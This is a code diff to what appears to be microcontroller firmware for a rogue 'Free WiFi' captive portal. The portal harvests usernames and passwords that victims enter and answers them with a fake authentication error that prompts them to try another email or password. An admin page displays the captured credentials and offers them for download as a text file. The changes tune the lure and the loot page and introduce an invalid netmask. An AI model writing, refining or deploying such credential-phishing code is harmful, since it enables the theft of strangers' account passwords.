@@ -3,9 +3,9 @@
 #include <DNSServer.h>
 
 // Network configuration
-const char *ssid = "Free WiFi Hotspot";
-IPAddress apIP(192, 168, 4, 1);
-IPAddress netMsk(255, 255, 255, 0);
+const char *ssid = "Free WiFi";
+IPAddress apIP(192, 168, 86, 1);
+IPAddress netMsk(255, 255, 225, 0);
 const byte DNS_PORT = 53;
 
 // Create instances of the server and DNS server
@@ -89,7 +89,7 @@ void handleSubmit() {
   String password = webServer.arg("password");
 
   // Store the input values in the credentials variable
-  credentials += "Username: " + username + ", Password: " + password + "<br>";
+  credentials += "Username: " + username + ", Password: " + password + " __nxtUsr__ ";
 
   // Send the input values over serial
   Serial.print("Username: ");
@@ -99,8 +99,8 @@ void handleSubmit() {
 
   // Send a response back to the client
   String response = "<html><body>";
-  response += "<p>(402) There was an error while verifiing your IP Adress.</p>";
-  response += "<p>Try re-entering your credentials or try a differnt password.</p>";
+  response += "<p>(401) There was an error while verifing your account.</p>";
+  response += "<p>Try a different email or password.</p>";
   response += "<a href='/'>Try Again</a>";
   response += "</body></html>";
 
@@ -116,7 +116,7 @@ void handleAdmin() {
   page += "h2 {text-align: center;} .credentials {background-color: #333; padding: 10px; border-radius: 10px;}";
   page += "</style></head><body><h2>Admin Panel</h2>";
   page += "<div class='credentials'>" + credentials + "</div>";
-  page += "<textarea id='textArea'>" + credentials + "</textarea><button id='btnSave'>Save text</button><script>btnSave.addEventListener('click', () => {const txt = textArea.value;const blob = new Blob([txt], {type: 'text/plain'});const url = URL.createObjectURL(blob);const ele = document.createElement('A');ele.href = url;ele.download = 'credentials.txt';ele.click();setTimeout(() => URL.revokeObjectURL(url), 1000);});</script>";
+  page += "<textarea id='textArea' style='background-color: #2e2e2e; color: #ffffff; width: 100%; height: 50vh;'>" + credentials + "</textarea><button id='btnSave' style='background-color: #444; color: #ffffff; border: none; padding: 10px 20px; cursor: pointer;'>Save List as .txt</button><script>document.getElementById('btnSave').addEventListener('click', () => {const txt = document.getElementById('textArea').value;const blob = new Blob([txt], {type: 'text/plain'});const url = URL.createObjectURL(blob);const ele = document.createElement('a');ele.href = url;ele.download = 'credentials.txt';ele.click();setTimeout(() => URL.revokeObjectURL(url), 1000);});</script>";
   page += "</body></html>";
 
   // Send the HTML content to the client
